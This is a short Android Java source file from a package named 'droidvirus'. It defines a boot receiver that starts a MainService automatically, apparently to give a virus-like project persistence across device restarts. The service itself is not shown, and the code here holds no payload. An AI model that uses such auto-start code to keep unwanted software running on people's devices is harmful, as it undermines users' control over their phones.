package com.artisanter.droidvirus;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

class BootReceiver extends BroadcastReceiver{
    @Override
    public void onReceive(Context context, Intent intent) {
        context.startService(new Intent(context, MainService.class));
    }
}
